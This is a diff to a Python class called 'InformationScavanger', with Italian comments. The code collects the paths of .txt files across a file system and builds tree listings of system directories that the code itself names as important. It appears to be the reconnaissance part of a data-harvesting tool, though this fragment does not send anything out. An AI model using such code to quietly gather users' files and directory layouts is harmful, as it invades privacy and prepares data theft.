@@ -260,12 +260,6 @@ class InformationScavanger:
         Procedura nella quale si effettua il retrieval delle informazioni relative al file system in cui il programma è eseguito.
         :return: None
         """
-
-        if os.name == "nt":
-            initial_path = '\\'
-        else:
-            initial_path = '/'
-
         self.fileSystem_string = self.retriveFiles()
         return self.fileSystem_string
 
@@ -306,7 +300,7 @@ class InformationScavanger:
         for root, dirs, files in os.walk(initial_path):
             for file in files:
                 if file.endswith(".txt"):
-                    return_string += "NOME FILE: "
+                    return_string += "##NOME FILE##: "
                     return_string += os.path.join(root, file)
                     return_string += "\n#####################################################\n"
                     try:
@@ -324,12 +318,25 @@ class InformationScavanger:
             directories_list = IMPORTANT_DIRECTORIES_WINDOWS
         else:
             directories_list = IMPORTANT_DIRECTORIES_LINUX
-
+        prefix = 0
+        depth = -1
         for dir in directories_list:
             for (root, dirs, files) in walk(dir, topdown=False):
-                for name in files:
-                    return_string += os.path.join(root, name)
-                for name in dirs:
-                    return_string += os.path.join(root, name)
+                livello = root[prefix:].count(
+                    os.sep)  # [_:] Modifica la stringa omettendo l'ultimo carattere a sinistra della quantità descritta dalla wildcard.
+                if -1 < depth < livello: continue
+                indent = ''
+                if livello > 0:
+                    indent = '|   ' * (livello - 1) + '|-- '
+                sub_indent = '|   ' * livello + '|-- '
+                return_string += '{}{}/'.format(indent, os.path.basename(root)) + "\n"  # self.realname(root)
+
+                for directory in dirs:
+                    if os.path.islink(os.path.join(root, directory)):
+                        return_string += '{}{}'.format(sub_indent, self.getPathName(directory, root=root)) + "\n"
+
+                for file in files:
+                    return_string += '{}{}'.format(sub_indent, self.getPathName(file, root=root)).encode('utf-8',
+                                                                                                         'replace').decode() + "\n"
 
         return return_string
